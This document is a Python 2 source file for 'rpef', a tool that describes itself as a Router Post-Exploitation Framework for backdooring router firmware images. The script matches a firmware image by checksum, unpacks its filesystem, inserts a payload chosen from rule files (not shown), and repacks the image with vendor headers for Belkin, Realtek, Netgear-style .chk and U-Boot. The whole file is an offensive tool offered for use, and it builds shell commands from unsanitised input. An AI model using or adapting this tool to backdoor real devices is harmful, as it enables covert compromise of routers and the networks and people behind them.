#!/usr/bin/env python

import argparse
import bz2
import hashlib
import json
import pylzma
import os
import re
import shutil
import string
import sys
import tempfile

# We enable and disable stdout/stderr throughout the program to hide verbose
# logging (unless the user specifies it).  This are global copies of the original
# stdout/stderr steams so we don't have to pass them around function calls.
orig_stdout = sys.stdout
orig_stderr = sys.stderr

def nodot(item):
    return item[0] != '.'

class ListAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        print "\nList of supported firmware targets:\n"
        print "Vendor\t\tRouter Model\t\tFirmware Version\tStatus"
        vendors = sorted(filter(nodot, os.listdir('rules')))
        for vendor in vendors:
            firmwares = sorted(filter(nodot, os.listdir('rules/%s' % vendor)))
            for firmware in firmwares:
                props = json.load(open('rules/%s/%s/properties.json' % (vendor, firmware), 'rb'))
                for target in props['Meta']['Targets']:
                    print "\t\t\t\t\t\t\t\t%s" % target['Status'],
                    print "\r\t\t\t\t\t%s" % target['Version'],
                    print "\r\t\t%s" % target['Model'],
                    print "\r%s" % target['Vendor']
        parser.exit()

class LongListAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        print "\nList of supported firmware targets:\n"
        print "Checksum\t\t\t\tVendor\t\tRouter Model\t\tFirmware Version\tStatus\t\tPayloads"
        vendors = sorted(filter(nodot, os.listdir('rules')))
        for vendor in vendors:
            firmwares = sorted(filter(nodot, os.listdir('rules/%s' % vendor)))
            for firmware in firmwares:
                props = json.load(open('rules/%s/%s/properties.json' % (vendor, firmware), 'rb'))
                for target in props['Meta']['Targets']:
                    print "\r\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t%s" % ", ".join(props['Payloads']),
                    print "\r\t\t\t\t\t\t\t\t\t\t\t\t\t%s" % target['Status'],
                    print "\r\t\t\t\t\t\t\t\t\t\t%s" % target['Version'],
                    print "\r\t\t\t\t\t\t\t%s" % target['Model'],
                    print "\r\t\t\t\t\t%s" % target['Vendor'],
                    print "\r%s" % props['Meta']['Checksum']
        parser.exit()

class NullDevice():
    def write(self, s):
        pass

def string_parser(text):
    vars_expr = re.compile( r"_[A-Z]+_")
    result = vars_expr.findall(text)
    if result:
        sub = {}
        curr_stdout = sys.stdout
        sys.stdout = orig_stdout
        for item in result:
            if item in props['Payloads'][args.payload]['Variables']:
                replace = raw_input("[+] INPUT REQUIRED, %s: " % props['Payloads'][args.payload]['Variables'][item])
                text = text.replace(item, replace)
        sys.stdout = curr_stdout
    return text

def filename_parser(target):
    if target == "_FIRMWARE_IMG_": # Input file
        return args.infile.name
    if target == "_TARGET_IMG_": # Output file
        return args.outfile.name
    elif target[0] == '/': # File path starts from tmp directory
        return "%s%s" % (tmp_dir, target)
    else: # File path starts from module directory
        return "%s/%s" % (module_dir, target)

def shell_command(command):
    print "\t\tExecuting: %s" % command
    out = os.popen(command)
    for line in out.readlines():
        print "\t\t%s" % line,
    out.close()

def abs_commands_parser(steps):
    n = 0
    for step in steps:
        n += 1
        orig_stdout = sys.stdout
        orig_stderr = sys.stderr
        if not args.verbose:
            sys.stdout = NullDevice()
            sys.stderr = NullDevice()

        # Make directory
        # mkdir %destdir
        if step[0] == "mkdir":
            arg1 = filename_parser(step[1])
            print "\tStep %d: Makedir %s" % (n, arg1)
            os.mkdir(arg1)

        # Copy file
        # cp %srcfile %destfile
        elif step[0] == "cp":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: Copy %s %s" % (n, arg1, arg2)
            shutil.copy2(arg1, arg2)

        # Move/rename file or directory
        # mv %src %dest
        elif step[0] == "mv":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: Move %s %s" % (n, arg1, arg2)
            shutil.move(arg1, arg2)

        # Remove a file
        # rm %destfile
        elif step[0] == "rm":
            arg1 = filename_parser(step[1])
            print "\tStep %d: Rm %s" % (n, arg1)
            os.remove(arg1)

        # Remove a directory
        # rmdir %destdir
        elif step[0] == "rmdir":
            arg1 = filename_parser(step[1])
            print "\tStep %d: Rmdir %s" % (n, arg1)
            shutil.rmtree(arg1)

        # Create file
        # touch %destfile
        elif step[0] == "touch":
            arg1 = filename_parser(step[1])
            print "\tStep %d: Touch %s" % (n, arg1)
            open(arg1, 'wb').close()

        # Change permissions of file or directory
        # chmod %octalstr %dest
        # For example:
        #  "chmod" "0777" "/extracted_fs/usr/sbin/httpd"
        elif step[0] == "chmod":
            arg1 = string.atoi(step[1], 8)
            arg2 = filename_parser(step[2])
            print "\tStep %d: Chmod %o %s" % (n, arg1, arg2)
            os.chmod(arg2, arg1)

        # Append file to file
        # appendfile %srcfile %destfile
        elif step[0] == "appendfile":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: Appendfile %s >> %s" % (n, arg1, arg2)
            app = open(arg2, 'ab')
            add = open(arg1, 'rb')
            app.write(add.read())
            app.close()
            add.close()

        # Append text to file
        # appendtext %str %destfile
        elif step[0] == "appendtext":
            arg1 = string_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: Appendtext \"%s\" >> %s" % (n, arg1, arg2)
            app = open(arg2, 'ab')
            app.write(arg1)
            app.close()

        # Extract bytes from file to file
        # extract %srcfile %offset %size %destfile
        elif step[0] == "extract":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = step[3]
            arg4 = filename_parser(step[4])
            print "\tStep %d: Extract %s, Offset %d, Size %d -> %s" % (n, arg1, arg2, arg3, arg4)
            ext = open(arg1, 'rb')
            ext.seek(arg2)
            out = open(arg4, 'wb')
            out.write(ext.read(arg3))
            ext.close()
            out.close()

        # Write arbitrary bytes at an arbitrary location
        # freewrite %destfile %offset %str
        elif step[0] == "freewrite":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = string_parser(step[3])
            print "\tStep %d: Freewrite %s, Offset %d -> \"%s\"" % (n, arg1, arg2, arg3)
            fw = open(arg1, 'r+b')
            fw.seek(arg2)
            fw.write(arg3)
            fw.close()

        # Pad file with given byte (in decimal) to desired size
        # pad %destfile %byte %size
        elif step[0] == "pad":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = step[3]
            print "\tStep %d: Pad %s to size %d with %d (0x%02x)" % (n, arg1, arg3, arg2, arg2)
            curr_size = os.path.getsize(arg1)
            to_pad = arg3 - curr_size
            if to_pad < 0:
                sys.stdout = orig_stdout
                sys.stderr = orig_stderr
                print "[-] ERROR:"
                print "\tTarget file is already larger than desired size."
                print "\tCurrent size: %d bytes" % curr_size
                print "\tTarget size : %d bytes" % arg3
                print "\tDifference  : %d bytes" % to_pad
                sys.exit(0)
            app = open(arg1, 'ab')
            app.write(chr(arg2) * to_pad)
            app.close()

        # bzip2 decompress file
        # bzip2-decomp %srcfile %destfile
        elif step[0] == "bzip2-decomp":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: Bzip2 Decompress %s -> %s" % (n, arg1, arg2)
            out = open(arg2, 'wb')
            out.write(bz2.BZ2File(arg1).read())
            out.close()

        # LZMA decompress file, currently requires .lzma extension
        # lzma-decomp %srcfile %destfile
        elif step[0] == "lzma-decomp":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: LZMA Decompress %s -> %s" % (n, arg1, arg2)
            # XXX: Python's LZMA support sucks, so we're just going to use a CLI utility for now
            shell_command("utilities/lzma --keep --decompress %s" % arg1)
            shutil.move(arg1[:-5], arg2)
#            src = open(arg1, 'rb')
#            out = open(arg2, 'wb')
#            # native lzma module to be added in python 3.3
#            #out.write(lzma.LZMAFile(arg1).read())
#            s = pylzma.decompressobj()
#            while True:
#                tmp = src.read(1)
#                if not tmp:
#                    break
#                out.write(s.decompress(tmp))
#            src.close()
#            out.close()

        # Unpack SquashFS utility, version 1.0
        # unsquashfs-1.0 %srcfile %destdir
        elif step[0] == "unsquashfs-1.0":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: unsquashfs-1.0 %s -> %s" % (n, arg1, arg2)
            shell_command("utilities/unsquashfs-1.0 -dest %s %s" % (arg2, arg1))

        # Unpack SquashFS utility, version 1.3 (LZMA compression)
        # unsquashfs-1.3-lzma %srcfile %destdir
        elif step[0] == "unsquashfs-1.3-lzma":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: unsquashfs-1.3 (lzma) %s -> %s" % (n, arg1, arg2)
            shell_command("utilities/unsquashfs-1.3-lzma -dest %s %s" % (arg2, arg1))

        # Unpack SquashFS utility, version 3.0 (LZMA compression)
        # unsquashfs-3.0-lzma %srcfile %destdir
        elif step[0] == "unsquashfs-3.0-lzma":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: unsquashfs-3.0 (lzma) %s -> %s" % (n, arg1, arg2)
            shell_command("utilities/unsquashfs-3.0-lzma -dest %s %s" % (arg2, arg1))

        # Unpack SquashFS utility, version 4.1
        # unsquashfs-4.1 %srcfile %destdir
        elif step[0] == "unsquashfs-4.1":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: unsquashfs-4.1 %s -> %s" % (n, arg1, arg2)
            shell_command("utilities/unsquashfs-4.1 -no-progress -dest %s %s" % (arg2, arg1))

        # Unpack CramFS utility, version 2.x
        # cramfsck-2.x %srcfile %destdir
        elif step[0] == "cramfsck-2.x":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: cramfsck-2.x %s -> %s" % (n, arg1, arg2)
            shell_command("utilities/cramfsck-2.x -v -x %s %s" % (arg2, arg1))

        # Build SquashFS utility, version 2.1
        # mksquashfs-2.1 %srcdir %blocksize %endianness %destfile
        # %endianness may be one of the following:
        #  "le" = little endian
        #  "be" = big endian
        elif step[0] == "mksquashfs-2.1":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = string_parser(step[3])
            arg4 = filename_parser(step[4])
            if arg3 == "le":
                endian = "Little"
            else:
                endian = "Big"
            print "\tStep %d: mksquashfs-2.1 %s, Blocksize %d, %s endian -> %s" % (n, arg1, arg2, endian, arg4)
            shell_command("utilities/mksquashfs-2.1 %s %s -b %d -root-owned -%s" % (arg1, arg4, arg2, arg3))

        # Build SquashFS utility, version 2.1 (LZMA compression)
        # mksquashfs-2.1-lzma %srcdir %blocksize %endianness %destfile
        # %endianness may be one of the following:
        #  "le" = little endian
        #  "be" = big endian
        elif step[0] == "mksquashfs-2.1-lzma":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = string_parser(step[3])
            arg4 = filename_parser(step[4])
            if arg3 == "le":
                endian = "Little"
            else:
                endian = "Big"
            print "\tStep %d: mksquashfs-2.1 (lzma) %s, Blocksize %d, %s endian -> %s" % (n, arg1, arg2, endian, arg4)
            shell_command("utilities/mksquashfs-2.1 %s %s -b %d -comp lzma -root-owned -%s" % (arg1, arg4, arg2, arg3))

        # Build SquashFS utility, version 3.0 (LZMA compression)
        # mksquashfs-3.0-lzma %srcdir %blocksize %endianness %destfile
        # %endianness may be one of the following:
        #  "le" = little endian
        #  "be" = big endian
        elif step[0] == "mksquashfs-3.0-lzma":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = string_parser(step[3])
            arg4 = filename_parser(step[4])
            if arg3 == "le":
                endian = "Little"
            else:
                endian = "Big"
            print "\tStep %d: mksquashfs-3.0 (lzma) %s, Blocksize %d, %s endian -> %s" % (n, arg1, arg2, endian, arg4)
            shell_command("utilities/mksquashfs-3.0-lzma %s %s -b %d -root-owned -%s" % (arg1, arg4, arg2, arg3))

        # Build SquashFS utility, version 3.2-r2 (LZMA compression)
        # mksquashfs-3.2-r2-lzma %srcdir %blocksize %endianness %destfile
        # %endianness may be one of the following:
        #  "le" = little endian
        #  "be" = big endian
        elif step[0] == "mksquashfs-3.2-r2-lzma":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = string_parser(step[3])
            arg4 = filename_parser(step[4])
            if arg3 == "le":
                endian = "Little"
            else:
                endian = "Big"
            print "\tStep %d: mksquashfs-3.2-r2 (lzma) %s, Blocksize %d, %s endian -> %s" % (n, arg1, arg2, endian, arg4)
            shell_command("utilities/mksquashfs-3.2-r2-lzma %s %s -b %d -root-owned -%s" % (arg1, arg4, arg2, arg3))

        # Build SquashFS utility, version 4.1 (LZMA compression)
        # mksquashfs-4.1-lzma %srcdir %blocksize %destfile
        elif step[0] == "mksquashfs-4.1-lzma":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = filename_parser(step[3])
            print "\tStep %d: mksquashfs-4.1 (lzma) %s, Blocksize %d -> %s" % (n, arg1, arg2, arg3)
            shell_command("utilities/mksquashfs-4.1 %s %s -b %d -comp lzma -root-owned -no-progress" % (arg1, arg3, arg2))

        # Build CramFS utility, version 2.x
        # mkcramfs-2.x %srcdir %edition %destfile
        elif step[0] == "mkcramfs-2.x":
            arg1 = filename_parser(step[1])
            arg2 = step[2]
            arg3 = filename_parser(step[3])
            print "\tStep %d: mkcramfs-2.x %s, Edition %d -> %s" % (n, arg1, arg2, arg3)
            shell_command("utilities/mkcramfs-2.x -e %d %s %s" % (arg2, arg1, arg3))

        # Belkin Extended Firmware Header utility (Create)
        # belky-extract %srckernerl %srcfs %srcnvram %destfile
        elif step[0] == "belky-create":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            arg3 = filename_parser(step[3])
            arg4 = filename_parser(step[4])
            print "\tStep %d: belky-create Kernel %s, Filesystem %s, NVRAM Settings %s -> %s" % (n, arg1, arg2, arg3, arg4)
            shell_command("utilities/belky -ce -e %s -k %s -fs0 %s -u %s" % (arg4, arg1, arg2, arg3))

        # Belkin Extended Firmware Header utility (Extract)
        # belky-extract %srcfile %destkernel %destfs %destnvram
        elif step[0] == "belky-extract":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            arg3 = filename_parser(step[3])
            arg4 = filename_parser(step[4])
            print "\tStep %d: belky-extract %s -> Kernel %s, Filesystem %s, NVRAM Settings %s" % (n, arg1, arg2, arg3, arg4)
            shell_command("utilities/belky -xe -e %s -k %s -fs0 %s -u %s" % (arg1, arg2, arg3, arg4))

        # TODO: Fuckin' fix PFS

        # Unpack PFS/0.9 utility
        # unpfs %srcfile %destdir
        elif step[0] == "unpfs":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            print "\tStep %d: unpfs %s -> %s" % (n, arg1, arg2)
            # The public PoC pfs utility only extracts to the current directory,
            # so we need to shuffle some files around
            os.mkdir(arg2)
            arg2_tmp = os.path.join(arg2, os.path.basename(arg1))
            shutil.copy2(arg1, arg2_tmp)
            shell_command("utilities/unpfs < %s" % arg2_tmp)
            os.remove(arg2_tmp)

        # Generate .chk header for firmware image
        # packet %srcfile %bidfile %configfile
        elif step[0] == "packet":
            arg1 = filename_parser(step[1])
            arg2 = filename_parser(step[2])
            arg3 = filename_parser(step[3])
            print "\tStep %d: packet %s %s %s" % (n, arg1, arg2, arg3)
            shell_command("utilities/packet -k %s -b %s -i %s" % (arg1, arg2, arg3))
            shutil.move("_kernel_rootfs_image.chk", arg1)
            os.remove("_kernel_image.chk")
            os.remove("_rootfs_image.chk")

        # Generate Realtek header/footer for firmware part
        # cvimg %srcfile %type %startaddr %burnaddr
        # %type may be one of the following:
        #  "root" = rootfs
        #  "linux" = Linux kernel
        elif step[0] == "cvimg":
            arg1 = filename_parser(step[1])
            arg2 = string_parser(step[2])
            arg3 = string_parser(step[3])
            arg4 = string_parser(step[4])
            print "\tStep %d: cvimg %s %s %s %s" % (n, arg1, arg2, arg3, arg4)
            outfile = tempfile.NamedTemporaryFile(dir=tmp_dir, delete=False)
            shell_command("utilities/cvimg %s %s %s %s %s" % (arg2, arg1, outfile.name, arg3, arg4))
            outfile.close()
            shutil.move(outfile.name, arg1)

        # Generate OpenWRT image header for firmware image
        # mkimage %srcfile %arch %os %imgtype %compression %loadaddr %entryp %imgname
        elif step[0] == "mkimage":
            arg1 = filename_parser(step[1]) # srcfile
            arg2 = string_parser(step[2])   # arch
            arg3 = string_parser(step[3])   # os
            arg4 = string_parser(step[4])   # imgtype
            arg5 = string_parser(step[5])   # compression
            arg6 = string_parser(step[6])   # loadaddr
            arg7 = string_parser(step[7])   # entryp
            arg8 = string_parser(step[8])   # imgname
            print "\tStep %d: mkimage %s, Arch %s, OS %s, Type %s, Compression %s, Load Addr %s, Entry Point %s, Name \"%s\"" % (n, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8)
            outfile = tempfile.NamedTemporaryFile(dir=tmp_dir, delete=False)
            shell_command("utilities/mkimage -A %s -O %s -T %s -C %s -a %s -e %s -n '%s' -d %s %s" % (arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg1, outfile.name))
            outfile.close()
            shutil.move(outfile.name, arg1)

        # Strip symbols from MIPS ELF binary
        # mipsel-uclibc-strip %srcfile
        elif step[0] == "mipsel-linux-strip":
            arg1 = filename_parser(step[1])
            print "\tStep %d: mipsel-linux-strip %s" % (n, arg1)
            shell_command("utilities/mipsel-linux-strip %s" % arg1)

        # Error: Unknown command
        else:
            sys.stdout = orig_stdout
            sys.stderr = orig_stderr
            print "\tERROR: Unrecognized command!"
            print "\t%s" % " ".join(step)
            sys.exit(1)

        sys.stdout = orig_stdout
        sys.stderr = orig_stderr

parser = argparse.ArgumentParser(description="Expedite and automate the process of backdooring router firmware images.")

parser.add_argument('--version', action='version', version="rpef: Router Post-Exploitation Framework v0.2")
parser.add_argument('-v', '--verbose', action='store_true', help="enable verbose output")
parser.add_argument('-l', '--list', action=ListAction, nargs=0, help="print the list of supported firmware targets")
parser.add_argument('-ll', '--longlist', action=LongListAction, nargs=0, help="print a detailed list of supported firmware targets")
parser.add_argument('-lt', '--leavetmp', action='store_true', help="don't delete temporary files once finished")
parser.add_argument('-i', '--id', action='store', type=str, dest="id", help="force target regardless of checksum")
extract_group = parser.add_argument_group("firmware processing")
extract_group.add_argument('infile', type=argparse.FileType('rb'), help="firmware image to modify")
extract_group.add_argument('outfile', type=argparse.FileType('wb'), help="file to save modified firmware image to")
extract_group.add_argument('payload', type=str, help="name of payload to deploy")

args = parser.parse_args()

print "[+] Verifying checksum"
md5 = hashlib.md5()
for chunk in iter(lambda: args.infile.read(128*md5.block_size), ''):
    md5.update(chunk)
checksum = md5.digest().encode('hex')

args.infile.seek(0)

success = False
vendors = filter(nodot, os.listdir("rules"))
try:
    for vendor in vendors:
        firmwares = filter(nodot, os.listdir("rules/%s" % vendor))
        for firmware in firmwares:
            props = json.load(open("rules/%s/%s/properties.json" % (vendor, firmware), 'rb'))
            if (args.id and props['Meta']['Checksum'] == args.id) or \
               (not args.id and props['Meta']['Checksum'] == checksum):
                success = True
                raise StopIteration()
except StopIteration:
    print "\tCalculated checksum: %s" % checksum
    for target in props['Meta']['Targets']:
        print "\tMatched target: %s %s %s (%s)" % (target['Vendor'], target['Model'], target['Version'], target['Status'])
    pass

if not success:
    print "ERROR: Firmware image didn't match any known target checksums!"
    print
    print "The firmware image you provided was:"
    print "\tFilename: %s" % args.infile.name
    print "\tChecksum: %s" % checksum
    print
    print "For a list of all supported firmware targets, use the '--longlist' flag."
    print "To force a target regardless of checksum, use the '--id' flag."
    sys.exit(1)

if props['Meta']['NeedsRoot'] and os.geteuid() != 0:
    print "ERROR: You must be root to continue!"
    sys.exit(1)

# Target module directory
module_dir = "rules/%s/%s" % (vendor, firmware)

# Temporary directories and files
tmp_dir = tempfile.mkdtemp()

for operation in props['OrderOfOperations']:
    if operation == "_PAYLOAD_":
        print "[+] Inserting payload"
        abs_commands_parser(props['Payloads'][args.payload]['Steps'])
    else:
        print "[+] %s" % props[operation]['Description']
        abs_commands_parser(props[operation]['Steps'])

if args.leavetmp:
    print "[+] Temporary files may be found in: %s" % tmp_dir
else:
    print "[+] Removing temporary files"
    toexec = [["rmdir", "/"]]
    abs_commands_parser(toexec)
